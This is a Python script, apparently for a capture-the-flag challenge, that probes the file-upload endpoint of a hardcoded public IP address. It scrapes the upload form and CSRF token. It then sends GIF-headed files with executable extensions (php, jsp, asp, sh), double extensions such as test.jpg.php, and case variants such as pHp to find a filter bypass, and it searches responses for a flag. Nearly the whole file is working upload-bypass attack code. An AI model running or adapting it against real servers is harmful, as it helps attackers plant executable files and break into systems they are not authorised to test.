import requests
import re
import os

os.environ.pop('HTTP_PROXY', None)
os.environ.pop('HTTPS_PROXY', None)
requests.packages.urllib3.disable_warnings()

TARGET = "http://119.29.238.216:8088"
session = requests.Session()
session.verify = False
session.proxies = {}
session.headers.update({"User-Agent": "Mozilla/5.0"})

print("="*70)
print("上传功能深度测试")
print("="*70)

# 获取上传页面
r = session.get(f"{TARGET}/upload", timeout=15)
print(f"状态码: {r.status_code}")
print(f"完整HTML:\n{r.text}")

# 提取表单
form_match = re.search(r'<form[^>]*>(.*?)</form>', r.text, re.DOTALL)
if form_match:
    print(f"\n表单内容:\n{form_match.group(1)}")

# 提取所有input字段
inputs = re.findall(r'<input[^>]*>', r.text)
print(f"\n所有input字段:")
for inp in inputs:
    print(f"  {inp}")

# 检查是否有CSRF
csrf_match = re.search(r'name=["\']csrf["\']\s*value=["\']([^"\']+)["\']', r.text)
csrf = csrf_match.group(1) if csrf_match else ""
print(f"\nCSRF Token: '{csrf}'")

# 检查是否有文件字段名
file_input = re.search(r'<input[^>]*type=["\']file["\'][^>]*>', r.text)
print(f"\n文件输入字段: {file_input}")
file_name = re.search(r'name=["\']([^"\']+)["\']', file_input.group(0) if file_input else "")
file_field = file_name.group(1) if file_name else "file"
print(f"文件字段名: {file_field}")

# 测试上传 - 不带CSRF
print("\n" + "="*70)
print("测试上传 - 不带CSRF")
print("="*70)

# 正常GIF
gif_header = b'GIF89a\x01\x00\x01\x00\x00\x00\x00!\xf9\x04\x00\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;'

files = {file_field: ("test.gif", gif_header, "image/gif")}
r = session.post(f"{TARGET}/upload", files=files, timeout=15)
print(f"状态码: {r.status_code}")
print(f"响应: {r.text[:800]}")

# 检查是否上传成功
if "上传成功" in r.text or "成功" in r.text or r.status_code == 200:
    print("⚠️ 可能上传成功!")
    
    # 搜索flag
    flag_match = re.search(r'flag\{[^}]+\}', r.text, re.IGNORECASE)
    if flag_match:
        print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
        exit(0)

# 测试上传 - 带CSRF
print("\n" + "="*70)
print("测试上传 - 带CSRF")
print("="*70)

files = {file_field: ("test.gif", gif_header, "image/gif")}
data = {"csrf": csrf} if csrf else {}
r = session.post(f"{TARGET}/upload", files=files, data=data, timeout=15)
print(f"状态码: {r.status_code}")
print(f"响应: {r.text[:800]}")

# 测试不同文件类型
print("\n" + "="*70)
print("测试不同文件类型")
print("="*70)

test_files = [
    ("test.gif", gif_header, "image/gif"),
    ("test.jpg", b"\xff\xd8\xff\xe0" + b"JFIF" + b"\x00"*100, "image/jpeg"),
    ("test.png", b"\x89PNG\r\n\x1a\n" + b"\x00"*100, "image/png"),
    ("test.bmp", b"BM" + b"\x00"*100, "image/bmp"),
    ("test.webp", b"RIFF" + b"\x00"*50 + b"WEBP", "image/webp"),
    ("test.svg", b"<?xml version=\"1.0\"?><svg></svg>", "image/svg+xml"),
]

for filename, content, content_type in test_files:
    try:
        files = {file_field: (filename, content, content_type)}
        r = session.post(f"{TARGET}/upload", files=files, timeout=15)
        print(f"\n>>> {filename} ({content_type})")
        print(f"状态码: {r.status_code}")
        print(f"响应: {r.text[:500]}")
        
        # 检查是否有文件路径返回
        path_match = re.search(r'uploads/[a-zA-Z0-9_.-]+', r.text)
        if path_match:
            print(f"上传路径: {path_match.group(0)}")
    except Exception as e:
        print(f"错误: {e}")

# 测试上传不同扩展名
print("\n" + "="*70)
print("测试不同扩展名")
print("="*70)

extensions = [
    ("test.jpg", "image/jpeg"),
    ("test.jpeg", "image/jpeg"),
    ("test.png", "image/png"),
    ("test.gif", "image/gif"),
    ("test.bmp", "image/bmp"),
    ("test.webp", "image/webp"),
    ("test.tiff", "image/tiff"),
    ("test.ico", "image/x-icon"),
    ("test.txt", "text/plain"),
    ("test.html", "text/html"),
    ("test.js", "application/javascript"),
    ("test.json", "application/json"),
    ("test.xml", "application/xml"),
    ("test.pdf", "application/pdf"),
    ("test.zip", "application/zip"),
    ("test.php", "application/x-php"),
    ("test.py", "text/x-python"),
    ("test.asp", "application/x-asp"),
    ("test.aspx", "application/x-aspx"),
    ("test.jsp", "application/x-jsp"),
    ("test.sh", "application/x-sh"),
]

for filename, content_type in extensions:
    try:
        # 使用GIF头+扩展名
        content = gif_header + b"test"
        files = {file_field: (filename, content, content_type)}
        r = session.post(f"{TARGET}/upload", files=files, timeout=15)
        print(f"\n>>> {filename} ({content_type}): {r.status_code}")
        
        if r.status_code == 200:
            print(f"响应: {r.text[:300]}")
            
            # 检查是否有文件路径
            path_match = re.search(r'uploads/[a-zA-Z0-9_.-]+', r.text)
            if path_match:
                print(f"上传路径: {path_match.group(0)}")
    except Exception as e:
        print(f"错误: {e}")

# 测试双扩展名
print("\n" + "="*70)
print("测试双扩展名")
print("="*70)

double_ext = [
    "test.jpg.php",
    "test.php.jpg",
    "test.png.php",
    "test.php.png",
    "test.gif.php",
    "test.php.gif",
    "test.jpg.py",
    "test.py.jpg",
    "test.png.py",
    "test.py.png",
]

for filename in double_ext:
    try:
        content = gif_header + b"test"
        files = {file_field: (filename, content, "image/gif")}
        r = session.post(f"{TARGET}/upload", files=files, timeout=15)
        print(f"\n>>> {filename}: {r.status_code}")
        if r.status_code == 200:
            print(f"响应: {r.text[:300]}")
            
            path_match = re.search(r'uploads/[a-zA-Z0-9_.-]+', r.text)
            if path_match:
                print(f"上传路径: {path_match.group(0)}")
    except Exception as e:
        print(f"错误: {e}")

# 测试大小写扩展名
print("\n" + "="*70)
print("测试大小写扩展名")
print("="*70)

case_ext = [
    "test.JPG",
    "test.PHP",
    "test.Jpg",
    "test.pHp",
    "test.GIF",
]

for filename in case_ext:
    try:
        content = gif_header + b"test"
        files = {file_field: (filename, content, "image/gif")}
        r = session.post(f"{TARGET}/upload", files=files, timeout=15)
        print(f"\n>>> {filename}: {r.status_code}")
        if r.status_code == 200:
            print(f"响应: {r.text[:300]}")
    except Exception as e:
        print(f"错误: {e}")

print("\n测试完成")
